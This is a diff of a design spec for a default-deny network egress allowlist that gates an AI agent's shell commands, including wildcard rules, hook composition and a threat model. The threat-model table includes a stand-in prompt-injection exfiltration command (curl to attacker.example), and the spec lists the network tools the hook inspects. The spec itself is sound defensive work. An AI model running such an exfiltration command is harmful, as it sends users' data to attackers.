@@ -1,9 +1,9 @@
 # Network egress allowlist (OSS Trust A-1) — spec
 
 **Status**: ready for `/write-plan` after operator approval
-**Parent**: `docs/specs/oss-trust-roadmap.md` Layer A item A-1
+**Parent**: `docs/specs/oss-trust-roadmap.md` Layer A item A-1 (parent spec is in PR #83 — not yet on `main` at the time of this spec's writing).
 **Target release**: v0.5.0
-**Depends on**: nothing new in main; uses the env-allowlist parser (P1-09) for the new env vars.
+**Depends on**: env-allowlist parser (P1-09 — in PR #69) for the new env vars. Both must merge before this spec implements.
 
 ## Problem
 
@@ -26,10 +26,10 @@ The fix isn't more regex. The fix is a default-deny network gate: agents reach a
 | D-2 | **Enforcement via `hooks/network-gate.sh`** — a PreToolUse hook that inspects Bash tool calls for `curl`, `wget`, `git fetch`, `nc`, `ssh`, etc., and refuses if the target host isn't in the allowlist. | Hook-level enforcement keeps the gate inside Walter-OS's existing approval surface; no new daemon to manage. |
 | D-3 | **Default-deny.** Allowlist starts empty after install; operator opts in to known-good hosts. | Sane secure floor. The `walter-os egress add <host>` subcommand makes it trivial to populate. |
 | D-4 | **Bundled bootstrap allowlist** at `contexts/_examples/egress-allowlist.example.txt` lists the hosts Walter-OS itself talks to (`api.github.com`, `api.anthropic.com`, `pypi.org`, `registry.npmjs.org`, `objects.githubusercontent.com`, `raw.githubusercontent.com`, etc.). Operator copies it on first use. | Avoids first-day frustration; the operator chooses to copy it, so it's still an explicit decision. |
-| D-5 | **Subdomain wildcard syntax**: `*.openrouter.ai` matches `api.openrouter.ai` but not `openrouter.ai` (matches Python `fnmatch` semantics). | Operator-friendly + unambiguous. |
+| D-5 | **Subdomain wildcard syntax**: single-label `*` (does NOT cross dots). `*.openrouter.ai` matches `api.openrouter.ai` and `auth.openrouter.ai`, but NOT `openrouter.ai` (no subdomain) and NOT `a.b.openrouter.ai` (two levels deep). Operator who wants multi-level uses an explicit second pattern: `*.openrouter.ai,*.api.openrouter.ai`. This is NOT Python `fnmatch` (which lets `*` cross dots); the loader does the dot-counting check itself. | Operator-friendly + unambiguous. Multi-level wildcards in domain allowlists are a recurring source of over-broad rules; explicit per-level is safer. |
 | D-6 | **Bypass requires `WALTER_EGRESS_ALLOW_OVERRIDE=1` + `--allow-egress-outbound` flag** — two-factor, same pattern as `bash-denylist`. | Single-factor bypasses get abused. |
 | D-7 | **CLI: `walter-os egress {add,remove,list,test}`**. `test <host>` returns whether the host would be allowed without making a request. | Operator can audit + adjust without re-editing the file. |
-| D-8 | **Approval-gate integration**: when the gate would otherwise allow a `curl https://X` command, it ALSO consults the egress hook. Gate's allow is necessary-but-not-sufficient; egress hook is the additional check. | Defense in depth. |
+| D-8 | **Independent PreToolUse hooks (no approval-gate coupling)**: network-gate runs as a separate hook in the PreToolUse chain. The chain semantics are "all hooks must allow" — approval-gate and network-gate compose by both being in the chain, NOT by approval-gate calling into network-gate. Either hook blocking → command blocked. This is the same composition pattern as `bash-denylist`. AC-6 below pins this composition. | Defense in depth without entangling two hooks' control flow. |
 
 ## Acceptance criteria
 
@@ -104,7 +104,7 @@ The fix isn't more regex. The fix is a default-deny network gate: agents reach a
   ```
 
 ### AC-5 — Installer + audit integration
-- [ ] `install.sh` adds a one-time prompt: "Walter-OS ships a default-deny egress allowlist. Import the bundled example? [Y/n]". On Y, runs `walter-os egress import contexts/_examples/egress-allowlist.example.txt`.
+- [ ] `install.sh` adds a one-time prompt: "Walter-OS ships a default-deny egress allowlist. Import the bundled example? [Y/n]". On Y, runs `walter-os egress import "${WALTER_OS_HOME}/contexts/_examples/egress-allowlist.example.txt"` (absolute path derived from `WALTER_OS_HOME`, matching the rest of `install.sh`'s convention — relative cwd-dependent paths would break when `install.sh` is invoked from anywhere other than the repo root).
 - [ ] `daily-supply-chain-audit` adds `check_egress_allowlist()`:
   - If the file doesn't exist → `info` finding (operator hasn't opted in yet — that's fine for the first day)
   - If the file is empty → `info` finding (every network call is blocked; probably misconfigured)
@@ -127,7 +127,7 @@ The fix isn't more regex. The fix is a default-deny network gate: agents reach a
 | Attack | Mitigation |
 |---|---|
 | Prompt-injection → `curl https://attacker.example/exfil` | `attacker.example` not in allowlist → blocked at PreToolUse |
-| Allowlist YAML poisoning by malicious operator dotfile | The file is a flat text list; no parser injection surface. The `egress-loader.sh` does `fnmatch`, never `eval`. |
+| Allowlist config poisoning / path-override by a malicious file under `$WALTER_CONFIG` | The file is a flat text list (one host per line), NOT YAML — no parser-injection surface. The `egress-loader.sh` does string-match + dot-counting (per D-5), never `eval`. An attacker who can write `~/.config/walter-os/egress-allowlist.txt` can add hosts, but the file is operator-owned (`chmod 0600`) and the `daily-supply-chain-audit` snapshots its sha256 so any drift is reported on the next audit run. |
 | Allowlist points at attacker-controlled mirror (e.g. operator pasted a typo'd hostname) | Daily audit checks if entries resolve to private IPs; operator-error mitigation. |
 | Bypass via the two-factor escape | Requires `WALTER_EGRESS_ALLOW_OVERRIDE=1` (env, operator-set) AND `--allow-egress-outbound` in the command (operator types it). Both must be present. |
 | Time-of-check / time-of-use (host resolution changes between gate and connection) | We pass the LITERAL host string, not a resolved IP. `curl` does its own resolution. We don't try to DNS-resolve in the gate. |
@@ -152,7 +152,7 @@ The fix isn't more regex. The fix is a default-deny network gate: agents reach a
 ## Open questions for the operator
 
 1. **Default-deny on first install?** Proposal: yes, default-deny, but `install.sh` prompts to import the bundled example (AC-5). Alternative: install with the bundled example already imported. Trade-off: explicit vs frictionless.
-2. **Wildcard depth**: `*.example.com` matches `api.example.com` but not `a.b.example.com`. Should it match arbitrary depth? Proposal: yes — `fnmatch` semantics (`*` matches anything including dots). Operator can use `*.example.com,*.api.example.com` for explicit two-level.
+2. **Wildcard depth**: D-5 picks single-label `*` (does NOT cross dots). `*.example.com` matches `api.example.com` only, NOT `a.b.example.com`. Multi-level requires an explicit second pattern. Should we instead allow `*` to cross dots? Proposal: no — explicit-per-level is the safer default for an allowlist. Operator can add `*.api.example.com` if they need two levels. Loader has dot-counting unit tests for `*.example.com` matching `api.example.com` (yes), `example.com` (no), and `a.b.example.com` (no).
 3. **`walter-os egress test <host>` should also resolve DNS and report the IP?** Proposal: no — DNS resolution at test-time would teach the agent what the IP is, which has its own leak surface. Test stays string-only.
 
 ## Refs
